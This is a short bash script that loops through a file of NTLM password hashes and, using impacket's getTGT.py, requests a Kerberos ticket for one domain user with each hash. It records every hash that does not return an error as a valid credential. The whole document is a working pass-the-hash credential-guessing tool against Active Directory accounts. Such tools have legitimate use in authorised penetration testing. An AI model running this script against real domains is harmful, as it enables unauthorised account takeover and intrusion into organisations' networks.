#!/bin/bash

# getTGT.py download from https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py

while getopts 'g:f:d:u:o:' OPTION; do
  case "$OPTION" in
    g)
      getTGT="$OPTARG"
      ;;
    f)
      testFile="$OPTARG"   
      ;;
    d)
      domainName="$OPTARG"
      ;;
    u)
      username="$OPTARG"
      ;;
    o)
      outputFile="$OPTARG"
      ;;
    ?)
      echo "script usage: $(basename \$0) [-g getTGT.py file path] [-f test file] [-d domain] [-u username] [-o outputFile]" >&2
      echo "execTGT.sh -g getTGT.py -f testHash.txt -d test.local -u test -o /tmp/test.txt"
      exit 1
      ;;
      
  esac
done
#shift "$(($OPTIND -1))"

if [ -z "$getTGT" ]; then
    echo '-g: getTGT.py file paht is required' >&2
    exit 1
fi

if [ -z "$testFile" ]; then
    echo '-f: test file is required' >&2
    exit 1
fi

if [ -z "$domainName" ]; then
    echo '-d: domain is required' >&2
    exit 1
fi

if [ -z "$username" ]; then
    echo '-u: username is required' >&2
    exit 1
fi

if [ -z "$outputFile" ]; then
    echo '-u: outputFile is required' >&2
    exit 1
fi

# file contains a list of NTLM password hashes e.g., aad3b435b51404eeaad3b435b51404ee:4bf0bf66851db901f83fcd62310d6307
file=$testFile
for i in `cat $file`
do
#echo "$i"
result=$($getTGT -hashes "$i" $domainName/"$username")                                                                                                                    
#echo $result
if [[ $result != *"Error"* ]]; then
  echo "$i" >> $outputFile
fi
done

echo "find valid password hashes:"
cat $outputFile